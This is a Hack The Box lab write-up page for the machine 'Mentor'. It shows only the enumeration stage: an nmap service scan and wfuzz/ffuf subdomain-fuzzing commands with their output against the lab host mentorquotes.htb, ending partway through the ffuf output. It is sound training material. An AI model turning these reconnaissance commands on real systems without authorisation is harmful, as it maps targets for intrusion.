<!doctype html>
<html class="no-js" lang="en" data-content_root="">
  <head><meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-2TCTE0JE23');
    </script>
        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Only4you" href="../only4you/only4you.html" /><link rel="prev" title="Manager" href="../manager/manager.html" />

    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
        <title>Mentor - blnkn&#39;s notes</title>
      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
    
    


<style>
  body {
    --color-code-background: #f8f8f8;
  --color-code-foreground: black;
  
  }
  @media not print {
    body[data-theme="dark"] {
      --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
    }
    @media (prefers-color-scheme: dark) {
      body:not([data-theme="light"]) {
        --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
      }
    }
  }
</style></head>
  <body>
    
    <script>
      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
    </script>
    

<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
  <symbol id="svg-toc" viewBox="0 0 24 24">
    <title>Contents</title>
    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
    </svg>
  </symbol>
  <symbol id="svg-menu" viewBox="0 0 24 24">
    <title>Menu</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
      <line x1="3" y1="12" x2="21" y2="12"></line>
      <line x1="3" y1="6" x2="21" y2="6"></line>
      <line x1="3" y1="18" x2="21" y2="18"></line>
    </svg>
  </symbol>
  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
    <title>Expand</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
      <polyline points="9 18 15 12 9 6"></polyline>
    </svg>
  </symbol>
  <symbol id="svg-sun" viewBox="0 0 24 24">
    <title>Light mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
      <circle cx="12" cy="12" r="5"></circle>
      <line x1="12" y1="1" x2="12" y2="3"></line>
      <line x1="12" y1="21" x2="12" y2="23"></line>
      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
      <line x1="1" y1="12" x2="3" y2="12"></line>
      <line x1="21" y1="12" x2="23" y2="12"></line>
      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
    </svg>
  </symbol>
  <symbol id="svg-moon" viewBox="0 0 24 24">
    <title>Dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
    </svg>
  </symbol>
  <symbol id="svg-sun-half" viewBox="0 0 24 24">
    <title>Auto light/dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
      <circle cx="12" cy="12" r="9" />
      <path d="M13 12h5" />
      <path d="M13 15h4" />
      <path d="M13 18h1" />
      <path d="M13 9h4" />
      <path d="M13 6h1" />
    </svg>
  </symbol>
</svg>

<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
<label class="overlay sidebar-overlay" for="__navigation">
  <div class="visually-hidden">Hide navigation sidebar</div>
</label>
<label class="overlay toc-overlay" for="__toc">
  <div class="visually-hidden">Hide table of contents sidebar</div>
</label>



<div class="page">
  <header class="mobile-header">
    <div class="header-left">
      <label class="nav-overlay-icon" for="__navigation">
        <div class="visually-hidden">Toggle site navigation sidebar</div>
        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
      </label>
    </div>
    <div class="header-center">
      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
    </div>
    <div class="header-right">
      <div class="theme-toggle-container theme-toggle-header">
        <button class="theme-toggle">
          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
        </button>
      </div>
      <label class="toc-overlay-icon toc-header-icon" for="__toc">
        <div class="visually-hidden">Toggle table of contents sidebar</div>
        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
      </label>
    </div>
  </header>
  <aside class="sidebar-drawer">
    <div class="sidebar-container">
      
      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
  
  <div class="sidebar-logo-container">
    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
  </div>
  
  <span class="sidebar-brand-text">blnkn's notes</span>
  
</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
  <input type="hidden" name="check_keywords" value="yes">
  <input type="hidden" name="area" value="default">
</form>
<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
</ul>
</li>
<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
</ul>
</li>
<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../administrator/administrator.html">Administrator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Mentor</a></li>
<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
<li class="toctree-l4"><a class="reference internal" href="../thefrizz/thefrizz.html">The Frizz</a></li>
<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/code/code.html">Code</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/dog/dog.html">Dog</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/escapetwo/escapetwo.html">Escape Two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
</ul>
</li>
</ul>

</div>
</div>

      </div>
      
    </div>
  </aside>
  <div class="main">
    <div class="content">
      <div class="article-container">
        <a href="#" class="back-to-top muted-link">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
          </svg>
          <span>Back to top</span>
        </a>
        <div class="content-icon-container">
          
<div class="theme-toggle-container theme-toggle-content">
            <button class="theme-toggle">
              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
            </button>
          </div>
          <label class="toc-overlay-icon toc-content-icon" for="__toc">
            <div class="visually-hidden">Toggle table of contents sidebar</div>
            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
          </label>
        </div>
        <article role="main">
          <p><img alt="mentor.png" src="../../../../_images/mentor.png" /></p>
<section id="mentor">
<h1>Mentor<a class="headerlink" href="#mentor" title="Permalink to this heading">#</a></h1>
<section id="enum">
<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># Nmap 7.93 scan initiated Thu Feb 16 17:22:00 2023 as: nmap -sV -sC -oN scans/initial.nmap 10.10.11.193</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.193</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.040</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">998</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">)</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">3</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="n">c73bfc3cf9ceee8b4818d5d1af8ec2bb</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">4440084</span><span class="n">c0ecbd4f18e7eeda85c68a4f7</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.52</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">mentorquotes</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">mentorquotes</span><span class="o">.</span><span class="n">htb</span><span class="p">;</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="c1"># Nmap done at Thu Feb 16 17:22:08 2023 -- 1 IP address (1 host up) scanned in 8.52 seconds</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wfuzz<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ.mentorquotes.htb&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>--hc<span class="w"> </span><span class="m">302</span>,400<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-t<span class="w"> </span><span class="m">50</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-c<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-z<span class="w"> </span>file,<span class="s2">&quot;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>http://mentorquotes.htb/
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">********************************************************</span>
<span class="o">*</span> <span class="n">Wfuzz</span> <span class="mf">3.1.0</span> <span class="o">-</span> <span class="n">The</span> <span class="n">Web</span> <span class="n">Fuzzer</span>                         <span class="o">*</span>
<span class="o">********************************************************</span>

<span class="n">Target</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">mentorquotes</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
<span class="n">Total</span> <span class="n">requests</span><span class="p">:</span> <span class="mi">38267</span>

<span class="o">=====================================================================</span>
<span class="n">ID</span>           <span class="n">Response</span>   <span class="n">Lines</span>    <span class="n">Word</span>       <span class="n">Chars</span>       <span class="n">Payload</span>
<span class="o">=====================================================================</span>

<span class="mi">000000142</span><span class="p">:</span>   <span class="mi">404</span>        <span class="mi">0</span> <span class="n">L</span>      <span class="mi">2</span> <span class="n">W</span>        <span class="mi">22</span> <span class="n">Ch</span>       <span class="s2">&quot;api&quot;</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ffuf<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-c<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-u<span class="w"> </span><span class="s2">&quot;http://mentorquotes.htb&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ.mentorquotes.htb&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-fc<span class="w"> </span><span class="m">302</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-mc<span class="w"> </span>all
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>        <span class="o">/</span><span class="s1">&#39;___\  /&#39;</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">&#39;___</span><span class="se">\</span>
<span class="s1">       /\ \__/ /\ \__/  __  __  /\ \__/</span>
       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\
        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>
         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\
          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>

       <span class="n">v1</span><span class="mf">.5.0</span> <span class="n">Kali</span> <span class="n">Exclusive</span> <span class="o">&lt;</span><span class="mi">3</span>
<span class="n">________________________________________________</span>

 <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
 <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">mentorquotes</span><span class="o">.</span><span class="n">htb</span>
